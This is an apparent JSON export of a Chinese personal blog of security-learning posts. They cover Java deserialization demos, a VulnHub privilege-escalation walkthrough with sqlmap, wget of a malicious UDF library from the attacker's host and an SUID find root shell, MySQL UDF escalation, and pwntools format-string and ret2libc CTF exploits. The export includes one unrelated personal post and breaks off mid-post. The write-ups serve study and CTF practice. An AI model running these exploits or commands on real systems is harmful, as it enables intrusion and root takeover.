{"pages":[],"posts":[{"title":"","text":"java反序列化学习-1 JAVA反序列化初步学习 ¶一、概念 java反序列化是为了便于存储和传输数据，将一个实例化类序列化写入一个文件，传输到另一台设备并执行反序列化，即可还原出这个实例化类并进行各项函数的调用、属性的读取等操作。 java的反序列化漏洞的思路和php有点像，也是找到危险函数通过链条调用来进行远程命令执行等操作。 ¶二、对象序列化和反序列化的基本实现 java的序列化与反序列化是通过 对象输出流 和 对象输入流 实现的： //对象输出流 java.io.ObjectOutputStream //对象输入流 java.io.ObjectInputStream 这里放一个简单的序列化和反序列化操作过程 这是一个学生类 这是序列化和反序列化操作，分别做了简单的封装 保存序列化数据的文件直接打开的话看到的是乱码，因为序列化后的数据是二进制的 对象的反序列化有以下几个要求： 1）类需要实现Serializable接口 2）不同设备上可能对类的函数实现存在出入（比如A机器上的学生类实现了toString方法，但是B机器的学生类没有实现这个方法） 这时候需要给类定义一个serialVersionUID属性，使用private static final long修饰，这样就可以正常恢复 ¶三、反序列化利用的基础知识&amp;原理 ¶（1）关键函数 readObject：我们对对象进行反序列化时会尝试调用对象的readObject方法， ¶（2）readObject 跟踪 从上面的反序列化函数跟进过来，进入ObjectInputStream.java： 分析一下代码，继续跟进： 进入readObject0方法： 这一段代码调用 peekByte 方法获取 bin 的第一个字节赋值给tc 如果第一个字节等于 TC_RESET 属性值（即121）则进入 while 循环 debug发现获取到的tc为 115，那么不会进入第一个循环。 接下来会进入switch语句，根据上面得到的tc的值，这里会进入TC_OBJECT分支，跟进后进入readOrdinaryObject函数： 接着跟进到readClassDesc，这里通过switch分支进入到readNonProxyDesc函数： 这里一路debug，可以跟进到如下信息： 这里的逻辑是：创建一个 ObjectStreamClass 对象和 Class 对象 再调用 resolveClass 方法，传入的参数为 readDesc ，通过 readClassDescriptor 方法获取到的 readDesc 包含着反序列化的类名和字段名等信息 接下来继续跟进： 回到 readOrdinaryObject 方法： 往下跟进看到： Class&lt;?&gt; cl = desc.forClass(); ... try { obj = desc.isInstantiable() ? desc.newInstance() : null; } ... 这段代码是从desc中获取Class类对象，再判断是否可以实例化： 继续向下： if (desc.isExternalizable()) { readExternalData((Externalizable) obj, desc); } else { readSerialData(obj, desc); } 这里调试发现是往readSerialData跳转的，两个方法都跟进一下： readExternalData 这里是如果 obj 有这个方法就调用，因为这里是跳转到readSerialData所以这个就不继续跟了 后续的操作也是各种invoke调用，就不再跟了… ¶四、反序列化利用简单实现 首先是试一下反射调用Runtime类来执行系统命令 public class test1 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { //java反序列化学习 Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,new Class[]{}).invoke(null); Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;calc.exe&quot;); } } 接下来测试利用不安全的类来利用反序列化 package com.unser1; import java.io.*; public class test2 { public static void main(String[] args) throws IOException, ClassNotFoundException { UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = &quot;弹出计算器&quot;; FileOutputStream fos = new FileOutputStream(&quot;object&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(&quot;object&quot;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); } } Unsafe类定义： package com.unser1; import java.io.IOException; import java.io.Serializable; public class UnsafeClass implements Serializable { public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); } }","link":"/2022/05/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"},{"title":"一个愚人","text":"​ “摆烂三个月，失恋治好了我的精神内耗” ​ 回想了一下发现已经三个月没更新过博客了，不得不说有些事情对人造成的打击确实比经历之前预想中的大得多。 ​ 不过还是不能就这样摆下去，过去的遗憾还是让它留在过去吧。再继续颓废的话，将来的某个时候想起今天的自己，想必又会更加痛苦吧… ​ 接下来计划是学习一些 pwn 、C开发方向的东西，不太清楚有没有机会学出点名堂，就争取一次吧。 ​ 在CTFTools上面看到一句话很喜欢，放在下面吧，如果哪天有幸被作者看到希望别捶我 ( ​ “喜欢就争取，得到就珍惜，错过就忘记” ​ 就这些吧，多的也说不出来了，敬自己。 ​ SpadeHeart ​ 2022.08.09 ​","link":"/2022/08/09/%E4%B8%80%E4%B8%AA%E6%84%9A%E4%BA%BA/"},{"title":"提权学习-mysql篇-2-LoadOfRoot","text":"¶一、概述 ​ 以vulnhub里的LoadOfRoot为例模拟一次完整的提权。 ¶二、基本知识点 ¶（1）nmap ​ nmap是一种探测计算机网络上的主机和服务的安全扫描器，它通过发送特制的数据包给目标主机或网络，并分析返回的数据包，以此绘制网络拓扑图。 ​ 利用nmap可以对特定网络地址内的节点进行扫描探测存活主机、还可以对主机端口进行扫描。 ​ 它的主要功能有：① 主机探测；② 端口扫描； ③ 版本检测； ④ 探测脚本编写 ¶（2）端口碰撞 ​ 端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。 ​ 端口试探的主要目的是防治攻击者通过端口扫描的方式对主机进行攻击。端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。由于对外的Linux服务器通过限制IP地址的方式来控制访问，因此可以利用这种端口试探方式来进行防火墙对于访问IP地址的控制。 ¶（3）suid提权原理 ​ suid（set user id）是一种授予文件的权限类型，它允许文件使用者以文件所有者的权限来执行文件，因此如果我们对一些只有较低权限的账户使用chmod进行suid提权，使其能够以root权限执行特定系统命令（如find），就可以达到针对局部命令的提权效果。 ​ suid的设置只针对二进制可执行文件,对于非可执行文件设置suid没有任何意义。 ¶（4）find命令 ​ find命令有一个-exec的参数，它的作用是对匹配的文件执行该参数所给出的shell命令，这里放两个例子： 12find . -name 'del.txt' -ok rm {} \\; # 在当前目录下查找‘del.txt’文件并把找到的文件删除find . -name 'aa.txt' -exec cp {} {}.bak \\; # 在当前目录下查找‘aa.txt’文件并将其复制为‘aa.txt.bak’ ​ 通过示例可以看出，这里命令参数是通过{}来传递的。 ¶三、测试 ¶（1）信息收集 ¶① nmap寻找主机 ​ 这里我把靶机和攻击机都放在一个局域网内，先寻找网络内存活主机 ¶② nmap端口扫描 ¶③ ssh连接 ​ 这里的提示是：knock easy as 1,2,3 ​ 需要敲击三次，端口碰撞，分别碰撞靶机的1,2,3端口 ¶④ 端口碰撞 ​ knock（需要apt get knockd 安装） ​ 再次扫描，这次加上-p-全端口扫描耗时会比较久 ¶⑤ 敏感信息搜寻 ​ 扫描一下目录 ​ 访问robots.txt 看到源码里有一段base64编码：THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh ​ 解密：Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer! ​ 再解密：/978345210/index.php ​ 访问之，得到登录界面 ¶（2）SQL注入 ¶① 库名 ​ 这里用sqlmap注入 ​ 命令：sqlmap -u http://192.168.112.132:1337/978345210/index.php --forms --dbs ​ 发现Webapp库比较可疑，继续注入 ¶② 表名 ​ 命令：sqlmap -u http://192.168.112.132:1337/978345210/index.php --forms -D Webapp --tables ¶③ 列名 ​ 命令：sqlmap -u http://192.168.112.132:1337/978345210/index.php --forms -D Webapp -T Users --columns ¶④ dump数据 ​ 命令：sqlmap -o -u （..省略..）index.php --forms -D Webapp -T Users -C id,password,username --dump ​ 用得到的数据ssh连接smeagol账号 ¶（3）udf提权 ¶① 敏感信息搜寻 ​ 查看数据库版本：dpkg -l | grep mysql ​ 查看进程信息：ps aux | grep mysql ​ 可以发现靶机安装的是5.5.44版本的mysql，进程有root权限 ​ 寻找有关键信息的文件： ​ 登录mysql ¶② 提权条件检查 ​ 如图所示，没什么阻碍 ​ udf的导入方法是：把恶意so文件放在kali网站根目录下，在靶机shell上wget下载下来，再导入到插件库下 ¶③ udf导入 ¶【1】下载恶意so文件 ​ 在smeagol的shell里操作 12cd /tmpwget http://192.168.112.128/udf.so ¶【2】导入到mysql的plugin库 ¶ ¶【3】mysql里创建函数并提权 ¶④ suid提权 ​ 有些命令在mysql里执行没有回显，所以需要获取root的shell ​ 在mysql里执行：select sys_eval('chmod u+s /usr/bin/find'); ​ 让调用者以root权限（find命令所有者）执行find命令 ​ 接着退回shell里执行 ​ find / -exec '/bin/sh' \\; ​ 对靶机系统的所有文件以dash的shell执行，这里是以root权限执行find命令，所以可以获取root的shell ​ 提权到root ​ 也可以反弹shell ​ 靶机/usr/bin里没有bash和dash和sh，反弹shell的话要用/bin/sh ¶四、原理解释 ¶（1）secure_file_priv对导入的限制 ​ secure_file_priv这个属性是用来限制mysql对文件导入导出的路径的，它有一下三种状态： 123NULL：这时mysql不允许导入导出&quot;&quot;：也就是这次测试的状态，对导入导出没有限制&quot;/tmp/&quot;：这时mysql只允许在`/tmp/`目录下进行文件的导入导出 ¶（2）chmod 提权原理 ​ 提权使用的命令：chmod u+s /usr/bin/find ​ 这是通过给命令添加suid权限来使得一般用户调用对应命令时以文件所有者root的权限执行 ¶（3）find执行提权原理 ​ 命令：find / -exec '/bin/sh' \\; ​ 这里我们以smeagol的shell用find在系统根目录下搜索所有文件，把所有文件放入/bin/sh的shell下。 ​ 此时的find进程拥有root权限，因此我们可以获得一个处在根目录下的root的shell ​ 这样一来就相当于获得了整个系统的root权限。 ¶（4）各级bin目录的区别 ​ /bin是所有用户都可以访问并执行的可执行程序，包括超级用户及一般用户。 ​ /usr/bin是系统安装时自带的一些可执行程序，即系统程序。 ​ /usr/local/bin 是用户自行编译安装时默认的可执行程序的安装位置。 ¶五、一些疑问 ​ 提权时测试了把sh换成bash发现会提权失败，只能用sh或者dash（sh指向dash） ​ 但是/bin目录底下的dash和bash所有者都是root，不懂为啥","link":"/2022/05/10/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0-mysql%E7%AF%87-2-LoadOfRoot/"},{"title":"提权学习--mysql篇(1)","text":"¶一、概述 ​ mySQL 数据库在安全领域中比较基础的使用是进行 SQL 注入，但是这种攻击方式获取到的信息比较局限，基本只能得到存在数据库里的东西，如果我们需要对目标机系统进行攻击，而我们拿到的webshell权限比较低，但是恰好有搭建 mySQL，这时就可以利用到 mySQL 对目标机进行提权操作。 ​ mySQL 所谓提权操作一般是指利用有较高权限的 mySQL 进程来执行系统函数，从而获取目标机的系统信息；这里提权是指提升攻击者操作目标机系统的权限。 ​ 大致思路：webshell（低权限）–&gt; mySQL（系统权限进程）–&gt; 系统函数执行 ¶二、基本概念分析 ¶（1）mySQL 自定义函数 ​ mySQL 提供自定义函数的功能，可以让用户根据业务需要来封装特定功能的函数，这里本地演示一下： ​ 如图所示，这是一个简单的自定义函数。 ¶（2）mySQL UDF 提权原理 ​ UDF是 mySQL 的一个拓展接口，UDF（User defined function）可翻译为用户自定义函数，是一个用来拓展 mySQL 的技术手段。从实际操作上来看，大致流程是我们在.dll后缀（Linux系统下是.so）的文件里编写自己的自定义函数，接着把恶意DLL库动态导入到目标机的 mySQL 的动态链接库里，就可以在目标机的 mySQL 里执行我们的自定义函数，这时如果 mySQL 进程的权限较高（比如windows下的mySQL进程一般都有管理员权限），这就使得用户自定义的函数也拥有管理员权限，我们也就拥有了执行危险系统命令的权限，这时就可以实现利用 mySQL 获得系统管理员权限的操作了。 ¶三、实践 ¶（1）环境搭建 ¶① 实验设备 ​ 1.攻击机：kali 虚拟机；win10 物理机 ​ 2.靶机：ubuntu18.04 虚拟机；win10虚拟机 ¶② 测试环境 ​ ubuntu 安装apache2，php7.2.24，mysql5.7 ¶（2）提权测试 ¶① 靶机基本信息获取 ​ 这里假设我们已经向目标网站上传了一句话木马getshell，并且找到了sql注入点。如图所示： ​ 这里看到在靶机里，mySQL 进程有root权限，而我们目前只有 www-data 权限。 ​ 通过这几张图，我们可以明确接下来的攻击方向：通过webshell和sql注入得到基本信息，再使用udf提权。 ¶② UDF提权可行性验证 ​ 基本信息（以 ubuntu18.04 为例）： ​ （1）@@plugin_dir --&gt; /usr/lib/mysql/plugin/（mySQL的动态链接库，udf要传到这里才能加载） ​ （2）secure_file_priv --&gt; /var/lib/mysql-files/ （通过show global variables like &quot;%secure%&quot;获取） ​ 这个属性限制了导入和导出只能在/var/lib/mysql-files/ 这个路径下，不然会出现报错： ​ ​ 我们选择把 udf 放在 mySQL 的 plugin 下实现创建自定义函数，这里我们要找一个UDF库 ​ kali的sqlmap里有，路径：/usr/share/sqlmap/data/udf/mysql/linux（windows也有对应文件夹） ¶③ 提权（win10虚拟机测试） ¶1）上传udf ​ 将kali里的恶意UDF（lib_mysqludf_sys.dll）上传到win10上的mySQL的插件库： ​ 路径：...\\MySQL5.7.26\\lib\\plugin ​ win10一般都有管理员权限，比较方便 ​ ¶2）蚁剑通过一句话马操作数据库创建自定义函数 ​ ¶3）实现提权 ​ ​ 这里可以看到通过提权函数得到的命令结果和虚拟机命令行里的一致。 ​ win10的系统权限管理不是很严，很多时候用户都是以管理员身份在使用电脑，这样他们搭建起来的 mySQL 服务也就具有较高的权限，这就使得提权攻击可以获取到靶机的较高权限，得以执行一些危险函数。 ¶④ 提权（ubuntu18.04虚拟机测试） ​ 基本操作原理和上面差不多，不过注入的文件用的是lib_mysqludf_sys.so ​ 这里执行sys_eval返回可能会出现NULL，即成功注入UDF但是执行命令返回为空，解决方法我放在下面。 ​ 提权演示： ¶1）将udf导入靶机mysql的动态链接库 ​ 这里有个问题：目前我们只有www-data账户的权限，而mysql设置了导入导出路径的限制，导致无法将so文件上传到动态链接库里，这里为了测试先直接把文件拷过去。o(╥﹏╥)o ​ ¶2）蚁剑通过一句话马操作数据库创建自定义函数 ​ ¶3）调用恶意函数实现www-data到mysql账户的提权 ​ ¶四、问题解决 ¶（1）ubuntu系统上命令执行不成功 ​ 执行以下三个命令： 1sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/ 1sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld 1sudo service mysql restart ​ 执行完成后即可正常提权。 ¶（2）udf文件上传到动态链接库 ​ 等我学明白后续再开一篇专门讲这个","link":"/2022/05/04/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0-mysql%E7%AF%87-1/"},{"title":"格式化字符串漏洞利用","text":"​ BUU上做到 [第五空间2019 决赛]PWN5 这道题，刚好用这题记录格式化字符串漏洞利用的学习。 ¶一、概述 ​ C语言的printf函数具有可变参数个数特性，如果只输入一个字符串，那么这个唯一的参数将被作为format string在函数调用时压入栈中。这时格式化字符串就具备了导致内存泄漏进而实现栈内存读写的功能。 ¶二、知识点学习及验证 ¶（1）漏洞成因 ​ 我们可以看这段代码中对printf函数的几种利用 ​ ​ ​ 从以上代码的执行结果来看，我们发现当我们使用格式化字符串时，虽然后面没有正常传入参数，但程序还是输出了一句字符串。这里输出的字符串和format string里%s之前的内容的恰好是一样的，那么我们可以思考，既然没有输入参数，printf函数是从哪里把这个字符串读出来的呢？ ​ 这里我们对printf函数的执行逻辑进行分析，printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。所以尽管我们没有输入参数，上面的代码也会将format string后面的内存当做参数输出。这样就会造成内存泄露。 ​ 在程序里，局部变量存储在栈里，当printf开始执行的时候，我们的格式化字符串就被压入栈里，接下来当，上面的执行结果就是由于printf读取了format string后面的内存导致内存泄漏的结果。接下来我们用IDA分析更直观地看看printf函数执行时发生了什么。 ​ 如图，%s入栈之后，printf会把指针上移来寻找字符串，这就把前面的内容读进去了。 ​ 分析的差不多了，我们可以想到，如果我们输入很多个格式化字符串，同时不传入对应参数。那么printf的特性就会使得它去读取format string后面的内存存储的数据并返回出来，这些数据就暴露给攻击者，造成内存泄漏。 ¶（2）任意内存读写 ​ 读内存 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc,char** argv){ char buf[100]; printf(&quot;input your format:\\n&quot;); scanf(&quot;%s&quot;,buf); printf(&quot;see what we got:\\n&quot;); printf(buf);} ​ 我们看看结果 ​ 可以看到这里我们找到了输入字符串在栈中的位置 ​ 写内存 ​ 注意：测试时我关闭了内存地址随机化（PIE），固定num变量的地址。 ​ 这里我分别对32位和64位编译的binary进行测试 ​ 32位 (ubuntu18.04 gcc编译) ​ 这里由于使用scanf会导致通过输入字符串注入内存地址时出现截断，因此采用命令行传参的形式输入。 1234567891011121314#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc,char** argv){ static int num=0; printf(&quot;num的地址为: %p\\n&quot;,&amp;num); char buf[100]; strcpy(buf,argv[1]); printf(buf); printf(&quot;\\n&quot;); printf(&quot;%d\\n&quot;,num); return 0;} ​ 可以发现我们通过反引号执行printf命令将num所在内存的地址以字符串形式存入栈中，再利用栈偏移定位到这个字符串，随后利用%n来把前面格式化字符串的长度存入这个字符串指向的目标空间内，这样就成功修改了局部变量num的值，而这个变量在代码里并没有修改的操作，我们实现了通过格式化字符串进行的内存写操作。 ​ 64位 ​ 64位程序的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这里和32位栈偏移不同。这里使用Pwngdb的fmtarg来定位栈偏移。 ​ gdb还不太会用所以先鸽…后续会单独开一篇讲64位的格式化字符串漏洞利用，大体就是确定栈偏移后通过格式化字符串和定位符控制指定位置的内存数据。 ¶三、题目分析 ​ 接下来进入题目的分析，首先checksec查看程序的基本信息 ​ ​ 接着进入IDA进行分析 ​ 经过上面的简单分析，我们发现要想getshell，就需要输入和随机密码相等的字符串，而随机密码我们是无法得知的。如果考虑栈溢出攻击的话，这里的buf字符串长度为70h，也没法栈溢出。那么接下来我们就可以看到第21行有一个可疑语句： 1printf(&amp;buf); ​ 这里就可以确定攻击思路，采用格式化字符串漏洞对无法得知的随机密码进行控制，从而getshell。 ¶四、解题思路 ​ 观察一下main函数，我们发现它是一个顺序逻辑：① 随机生成密码 ；② 输入名字并输出 ；③ 输入密码并比较 ；显然攻击点就在名字的输入上，输入恶意语句后，通过printf输出触发漏洞利用实现修改密码。 ​ 首先我们要找到密码所在内存中的位置，通过上图的分析，我们发现这个四位密码就存在0x0804C044开始的四个字节里。 ​ 接下来需要找到buf字符串输入后在栈内的偏移，我们把程序运行一下来找找 ​ 这里得知用户输入存储在栈内偏移为10的地址上，接下来就是进行内存覆盖了。 ​ 我们通过把随机密码的地址通过printf输出出来，密码的地址就被依次写入了第十个偏移地址开始的四个地址里，成为了它们的值，这时在程序里相当于我们一共输入了16个字节（32位程序每个地址占四字节），我们利用%n和定位符来把16赋值给这四个 “值” 指向的空间，这样一来，程序生成的随机密码就被覆盖成四个16了。 ​ 接下来我们输入覆盖后的密码即可getshell。 ​ 另一种解法是利用pwntools的fmtstr_payload工具，通过修改任意内存把atoi函数的GOT表改成system函数地址，再手写”/bin/sh“，即可getshell。 ¶五、WriteUP ​ 解法一 12345678from pwn import *p = remote(&quot;node4.buuoj.cn&quot;,27997)payload = p32(0x804C044)+p32(0x804C045)+p32(0x804C046)+p32(0x804C047) # 共16个字节payload += b&quot;%10$n%11$n%12$n%13$n&quot; p.sendline(payload)p.sendline(str(0x10101010))p.interactive() ​ 解法二 12345678910from pwn import *p = remote(&quot;node4.buuoj.cn&quot;,27997)elf = ELF(&quot;./pwn&quot;)atoi = elf.got['atoi']system = elf.plt['system']payload = fmtstr_payload(10,{atoi:system})p.sendline(payload)p.sendline(b'/bin/sh')p.interactive() ¶六、总结 ​ 格式化字符串漏洞利用思路：① 寻找注入点 -&gt; ② 确定可控栈偏移 -&gt; ③ 读写内存","link":"/2022/08/09/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"title":"ret2libc_x64 篇(1)","text":"​ 最近在buu上遇到一些ret2libc的题，记录一下这种对攻击方式的理解 ¶一、概述 ​ ret2libc，这个词可以拆分为两个部分，即ret（返回）和libc（Linux下的一个动态链接库）。顾名思义，这种攻击方式是通过让程序返回一些数据使我们能够定位libc的基址，进而利用诸如pwntools这类工具来配合上一些特殊函数（如system()）或字符串（如 /bin/sh）相对libc基址的偏移，计算出这些函数的真实地址，从而通过栈溢出等方式执行这些函数来getshell。 ¶二、理论解释 ¶（1）、GOT表和PLT表 ​ GOT表全称为全局偏移表（Global Offset Table）、PLT表全称为过程链接表（Procedure Linkage Table），GOT表存放函数地址，而PLT表则存储用于获取数据段存放函数地址的一小段额外代码。下面放一个图： ​ 从这个流程图可以看出，一个可执行程序调用动态链接库里的函数时，是通过：程序-&gt;plt-&gt;got-&gt;libc这样的过程实现的。 ​ 现代操作系统不允许修改代码段，只能修改数据段，也就是回写，更专业的称谓应该是运行时重定位。所以上述过程实际的实现过程是，当程序第一次调用printf()时，链接阶段我们不知道printf()的地址，只知道它在libc库里，所以链接阶段不能直接重定位，但是运行阶段知道了printf的地址却无法修改代码段，那么要怎么让编译阶段生成的call命令感知到运行阶段确定的printf()的地址呢？ ​ 解决方案是：链接器会生成一个print_stub函数，这个函数会跳转到printf()真正的地址去执行，链接时所谓对printf()的重定位就转化为对printf_stub的重定位，等到了运行时才会对**printf()真正进行重定位并获取它的地址，这样下次再调用printf()**函数时就可以直接在GOT表里找到它了。 ¶（2）、延迟绑定 ​ 动态链接 的程序是在运行时对全局和静态数据访问进行GOT定位，然后间接寻址。同样，对于模块间的调用也需要GOT定位，再才间接跳转，这么做势必会影响到程序的运行速度。而且程序在运行时很大一部分函数都可能用不到，于是ELF采用了当函数第一次使用时才进行绑定的思想，也就是我们所说的 延迟绑定。ELF实现 延迟绑定 是通过 PLT ，原先 GOT 中存放着全局变量和函数调用，现在把他拆成两个部分 .got 和 .got.plt，用 .got 存放着全局变量引用，用 .got.plt 存放着函数引用。当程序需要调用到其他模块中的函数时例如 fun() ，就去访问保存在 .got.plt 中的 fun@plt ，如果程序是第一次调用这个函数，动态链接器就会去动态共享模块中查找 fun函数的真实地址然后将真实地址保存到fun@got中(.got.plt)；如果之前已经调用过，那么访问fun@plt时，就直接跳转到fun@got中去。 ¶（3）、DEP/NX ​ DEP**(DataExecutionPrevention)/NX(Non-executable)** 防护，能写的地方不能执行，能执行的地方不能写。在开启这个防护之后，原先栈溢出通过返回到另一个函数所在地址，在数据层面去执行的方式就不可行了。 ​ 验证一下，如下图所示，开启canary保护之后就无法直接通过栈溢出覆盖来执行shellcode了 ​ ​ ¶（4）、动态链接 ​ 动态链接（Dynamic Linking），是指在程序装载时动态链接器将程序需要的所有动态链接库装载至进程空间中，当程序运行时将它们链接在一起形成一个完整程序的过程。如果一个可执行函数调用了libc.so库下的system()函数，那么它在链接时就会而如果这个程序并没有调用system()函数，但是它装载时一定会装载最基本的libc库，而这个库里是有我们需要的shellcode的，这时就为我们通过libc库来getshell提供了可能性。 ¶（5）、Libc基址泄露原理 ​ 前面的基本理论介绍完后，这里对Libc基址泄露的思路也就基本清晰了，当一个程序里没有现成的shellcode时，我们可以确定的是它一定链接了libc库，因此我们可以通过定位程序里其它的属于libc库的函数，利用它的真实地址和这个函数在对应版本的libc库里的偏移来确定libc的基址，然后再查询这个libc库里的shellcode相关函数的偏移，通过拼接确定shellcode的真实地址，然后将其通过栈溢出等方式覆盖程序返回地址实现getshell。 ¶三、题目运用 ¶ciscn_2019_c_1 ​ checksec得到如下信息： 12345Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ​ 接着就进IDA分析，这里配合简单运行测试了一下，发现漏洞点就在encrypt函数里： ​ ​ 这里我们的输入会被进行各种异或处理，为了让输入不被处理，就需要绕过strlen()的判断，这里可以通过\\0来直接绕过，接着就是通过构造大量字符形成栈溢出并覆盖返回地址来执行命令，payload如下： 1b'\\0'+b'a'*(0x50-1+8) ​ 接着我们查看字符串可以发现这个程序里并没有现成的shellcode，所以我们要通过泄露libc的基址来定位shellcode的地址。这里我们看到puts函数被调用了多次，可以选择利用它，详细过程见代码注释。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import *r = remote(&quot;node4.buuoj.cn&quot;,25234)elf = ELF(&quot;./ciscn_2019_c_1&quot;)main = 0x400b28pop_rdi = 0x400c83 # by ROPgadgetret = 0x4006b9puts_plt = elf.plt['puts']puts_got = elf.got['puts']r.sendlineafter(b'choice!\\n',b'1')payload = b'\\0'+b'a'*(0x50-1+8)payload += p64(pop_rdi) # 构造ROP链条，设置rdi寄存器的值为puts的got表地址payload += p64(puts_got) # 调用puts函数，输出的是puts的got表地址payload += p64(puts_plt) # 设置返回地址为puts的plt表地址，控制程序执行流payload += p64(main) # 返回到main函数，便于下次再次利用输入点构造ROPr.sendlineafter(b'encrypted\\n',payload)r.recvline()print(r.recvline())puts_addr = u64(r.recvuntil(b'\\n')[:-1].ljust(8,b'\\0')) # 截取puts的地址print(puts_addr)libc = LibcSearcher('puts',puts_addr) # 获取libcoffset = puts_addr-libc.dump('puts') # 计算libc基址binsh = offset+libc.dump('str_bin_sh') # 定位shellcodesystem = offset+libc.dump('system') # 定位shellcoder.sendlineafter(b'choice!\\n',b'1')payload = b'\\0'+b'a'*(0x50-1+8)payload += p64(ret) # 再次构造ROP链条getshellpayload += p64(pop_rdi)payload += p64(binsh)payload += p64(system)r.sendlineafter(b'encrypted\\n',payload)r.interactive() ¶[OGeek2019]babyrop ​ 这题是32位程序，读入一串随机数，比较通过之后有一个栈溢出 ​ ​ 这里还是一样的\\0绕过，接下来是填充栈并让最后一位尽可能大来触发接下来的栈溢出 ​ ​ 审审代码，分析一下内存地址就可以知道这里的a1和输入字符串的首地址偏移为8，所以我们输入的第8位会被覆盖给它，所以就不展开说了。 exp: 1234567891011121314151617181920212223242526272829303132333435from pwn import *from LibcSearcher import *# 打两次r = remote(&quot;node4.buuoj.cn&quot;,27934)elf = ELF('./babyrop')payload1 = b'\\x00' + b'a'*6 + b'\\xFF'r.sendline(payload1)r.recvuntil(b&quot;Correct\\n&quot;)write_plt=elf.plt['write']write_got=elf.got['write']main_addr = 0x08048825payload1 = b'a'*0xe7+b'a'*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)r.sendline(payload1)write_addr = u32(r.recv()[0:4])print(hex(write_addr))libc = ELF('./libc-2.23.so')libc_base = write_addr - libc.symbols['write']system_libc=libc.symbols['system']binsh_libc=next(libc.search(b'/bin/sh'))system_addr = libc_base + system_libcbinsh_addr = libc_base + binsh_libcpayload1 = b'\\x00' + b'a'*6 + b'\\xFF'r.sendline(payload1)r.recvuntil(b&quot;Correct\\n&quot;)payload2 = b'a'*(0xE7) + b'c'*4 + p32(system_addr) + b'a'*4 + p32(binsh_addr)r.sendline(payload2)r.interactive() ¶四、总结 ​ ret2libc的基本思路就是通过将程序内的函数和对应版本的libc对照来泄露libc的基址，从而获取到shellcode的地址，同时通过构造ROP链条绕过NX保护并getshell。","link":"/2022/08/15/ret2libc-x64-%E7%AF%87-1/"},{"title":"ROP链条构造-mprotect写入shellcode","text":"​ 基于buu题目get_started_3dsctf_2016，通过mprotect函数在程序开启NX保护的情况下操作内存实现写入shellcode ¶一、概述 ​ 这题比较迷的是本地和远程有两种打法，本地可以直接用栈溢出+ret2text搞定，远程就需要构造链条了。 ¶二、方法分析 ¶（一）mprotect函数 ​ 首先看一下mprotect函数的API介绍 12345678910111213#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：1）PROT_READ：内存段可读；2）PROT_WRITE：内存段可写；3）PROT_EXEC：内存段可执行；4）PROT_NONE：内存段不可访问。返回值：0；成功，-1；失败（并且errno被设置）1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。3）ENOMEM：内核内部的结构体无法分配。 ​ 这个函数可以用于修改内存页的权限，在无法找到可用shellcode的时候，就可以考虑通过这种方式在程序运行所在的内存区里植入一个shellcode，接着在ROP链条里返回到shellcode里执行。 ¶（二）题目分析 ​ 本题是32位程序，开启NX防护，无法直接简单的通过栈溢出跳到危险函数的地址来执行，因此远程需要通过构造ROP链条来执行shellcode并利用ret一层层返回出来，比较类似WEB里的php反序列化。网上很多文章都是说本地可以在get_flag()函数的地址后面加一个exit()函数的地址作为返回地址，再加上符合判断条件的两个参数，让get_flag()函数在判断成功打印flag之后退出，就可以看到回显。这个方法在本地确实可行，之所以在远程不可行，个人推测是因为这种让程序强行退出来获取回显的方法会触发服务器的一些保护机制，使得程序在返回到exit()后就崩溃了，无法远程返回我们需要的flag。 ​ 